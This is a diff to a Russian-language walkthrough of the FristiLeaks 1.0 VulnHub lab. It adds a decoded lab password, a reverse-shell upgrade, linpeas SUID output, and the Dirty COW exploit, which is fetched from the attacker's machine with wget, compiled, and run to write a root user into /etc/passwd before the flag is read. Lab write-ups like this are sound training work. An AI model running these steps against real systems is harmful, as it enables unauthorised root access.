@@ -125,6 +125,12 @@ mramsmeets
 Ar0xA
 ```
 
+### Endpoint `/fristi/`
+Пока брутил директории, вручную наткнулся на страницу авторизации  
+```
+http://192.168.56.128/fristi/
+```
+
 Есть подсказки в исходном коде
 ![login_br](screenshots/01.login_br.png)
 
@@ -135,6 +141,7 @@ Ar0xA
 ```
 
 В конце страницы закомментированный код base64, пробую создать `<img \>` на странице, чтобы его посмотреть
+![login_pass](screenshots/01.login_pass.png)
 ```html
 <img src="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
 jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
@@ -161,12 +168,15 @@ U5ErkJggg==" />
 ```
 
 Похоже на пароль
+![login](screenshots/01.login.png)
 ```
 keKkeKKeKKeKkEkkEk
 ```
-![login](screenshots/01.login.png)
 
 В итоге не пришлось брутить, сразу вошел по кредам `eezeepz:keKkeKKeKKeKkEkkEk`
+
+
+## 📂 Получение доступа
 
 Попробовал загрузить изображение  
 ![uploads](screenshots/02.uploads.png)
@@ -203,6 +213,7 @@ uid=48(apache) gid=48(apache) groups=48(apache)
 sh: no job control in this shell
 sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
 python -c 'import pty;pty.spawn("/bin/bash")'
+bash-4.1$ export TERM=xterm
 bash-4.1$ ^Z
 zsh: suspended  nc -lvnp 5555
                                                                                                                   
@@ -216,6 +227,9 @@ bash-4.1$ id
 uid=48(apache) gid=48(apache) groups=48(apache)
 bash-4.1$ 
 ```
+
+
+## ⚙️ Привилегии
 
 Поднимаю сервер
 ```bash
@@ -281,20 +295,98 @@ gcc.x86_64                          4.4.7-16.el6                           @base
 /usr/bin/gcc
 ```
 
+### SUID
+```bash
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                
+                      ╚════════════════════════════════════╝                                                      
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                   
+strace Not Found                                                                                                  
+-rwsr-xr-x. 1 root root 76K Oct 15  2014 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                            
+-rwsr-x---. 1 root fuse 28K Dec  7  2011 /bin/fusermount
+-rwsr-xr-x. 1 root root 53K Oct 15  2014 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x. 1 root root 35K Nov 10  2015 /bin/su
+-rwsr-xr-x. 1 root root 38K Jul 23  2015 /bin/ping
+-rwsr-xr-x. 1 root root 36K Jul 23  2015 /bin/ping6
+-rwsr-xr-x. 1 root root 11K Aug 18  2015 /sbin/pam_timestamp_check
+-rwsr-xr-x. 1 root root 35K Aug 18  2015 /sbin/unix_chkpwd
+-rwsr-xr-x. 1 root root 51K Nov 10  2015 /usr/bin/crontab
+-rws--x--x. 1 root root 20K Oct 15  2014 /usr/bin/chsh
+---s--x--x. 1 root root 121K Aug 13  2015 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rws--x--x. 1 root root 20K Oct 15  2014 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x. 1 root root 36K Apr  7  2015 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x. 1 root root 65K Apr  7  2015 /usr/bin/chage
+-rwsr-xr-x. 1 root root 70K Apr  7  2015 /usr/bin/gpasswd
+-rwsr-xr-x. 1 root root 31K Feb 22  2012 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                             
+-rwsr-xr-x. 1 root root 252K Aug 13  2015 /usr/libexec/openssh/ssh-keysign
+-rws--x--x. 1 root root 14K Sep 22  2015 /usr/libexec/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
+-r-s--x---. 1 root apache 14K Aug 24  2015 /usr/sbin/suexec
+-rwsr-xr-x. 1 root root 8.8K Nov 10  2015 /usr/sbin/usernetctl
+```
+
+Загружаю **Dirty Cow** exploit
+![dirty](screenshots/05.dirty.png)  
+
+Загружаю на жертву, компилирую и запускаю с параметром **admin** для пароля  
+```bash
+bash-4.1$ wget http://192.168.56.106:8888/cow.c        
+bash-4.1$ gcc -pthread cow.c -o dirty -lcrypt
+bash-4.1$ ./dirty admin
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: admin
+Complete line:
+firefart:fikF6I.XwWM36:0:0:pwned:/root:/bin/bash
+
+mmap: 7ff8733aa000
+madvise 0
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'admin'.
 
 
-## 📂 Получение доступа
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+```
+
+Получаю **root**  
+```bash
+bash-4.1$ su firefart
+Password: 
+[firefart@localhost tmp]# id
+uid=0(firefart) gid=0(root) groups=0(root)
+[firefart@localhost tmp]# cd /root
+[firefart@localhost ~]# ls -la
+total 48
+dr-xr-x---.  3 firefart root 4096 Nov 25  2015 .
+dr-xr-xr-x. 22 firefart root 4096 Jul 21 23:51 ..
+-rw-------   1 firefart root 1936 Nov 25  2015 .bash_history
+-rw-r--r--.  1 firefart root   18 May 20  2009 .bash_logout
+-rw-r--r--.  1 firefart root  176 May 20  2009 .bash_profile
+-rw-r--r--.  1 firefart root  176 Sep 22  2004 .bashrc
+drwxr-xr-x.  3 firefart root 4096 Nov 25  2015 .c
+-rw-r--r--.  1 firefart root  100 Sep 22  2004 .cshrc
+-rw-------.  1 firefart root 1291 Nov 17  2015 .mysql_history
+-rw-r--r--.  1 firefart root  129 Dec  3  2004 .tcshrc
+-rw-------.  1 firefart root  829 Nov 17  2015 .viminfo
+-rw-------.  1 firefart root  246 Nov 17  2015 fristileaks_secrets.txt
+[firefart@localhost ~]# cat fristileaks_secrets.txt 
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
 
 
-
-## ⚙️ Привилегии
-
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+```
 
 
 ## 🏁 Флаги
 
 - User flag: 
-- Root flag: 
+- Root flag: Y0u_kn0w_y0u_l0ve_fr1st1
+ 
 
 ---
 
